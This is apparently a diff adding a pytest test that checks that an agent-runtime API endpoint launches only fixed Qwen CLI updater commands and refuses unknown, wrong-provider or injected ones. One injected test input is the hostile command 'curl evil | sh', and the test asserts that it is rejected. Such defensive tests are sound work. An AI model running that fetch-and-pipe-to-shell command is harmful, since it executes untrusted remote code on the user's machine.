@@ -2740,6 +2740,31 @@ def test_install_launch_update_standalone_reruns_its_installer_not_npm(monkeypat
     assert 'npm' not in calls[0]
 
 
+@pytest.mark.parametrize('method', ['standalone', 'standalone-windows', 'npm', 'unknown', 'injected', 'wrong-provider'])
+def test_qwen_update_launch_uses_only_its_fixed_updaters(monkeypatch, client, method):
+    from mc import qwen_cli_install
+    from mc.blueprints import agent_routes as ar
+    hint = {'npm': 'npm install -g @qwen-code/qwen-code@latest',
+            'unknown': '', 'injected': 'curl evil | sh',
+            'wrong-provider': 'npm install -g @openai/codex'}.get(method)
+    if hint is None:
+        hint = qwen_cli_install.UPDATE_COMMANDS[method]
+    calls = []
+    monkeypatch.setattr(ar._agent_runtime, 'get_runtime', lambda name: _UpdateRuntime(hint))
+    monkeypatch.setattr(ar.shutil, 'which', lambda name: '/x/' + name)
+    monkeypatch.setattr(ar, '_launch_install_terminal',
+                        lambda cmd: (calls.append(cmd) or 'qwen-update', None))
+    body = client.post('/api/agent/provider/qwen/install-launch', json={'update': True}).get_json()
+    if method in ('unknown', 'injected', 'wrong-provider'):
+        assert body['ok'] is False and calls == []
+    elif method == 'npm':
+        assert body['ok'] is True and '@qwen-code/qwen-code' in calls[0]
+        assert 'install-qwen-standalone' not in calls[0]
+    else:
+        assert body['ok'] is True and calls == [hint]
+        assert 'npm' not in calls[0]
+
+
 def test_install_launch_update_brew_and_windows_and_refusals(monkeypatch, client):
     from mc import agent_runtime as rt
     C = rt.CODEX_UPDATE_COMMANDS
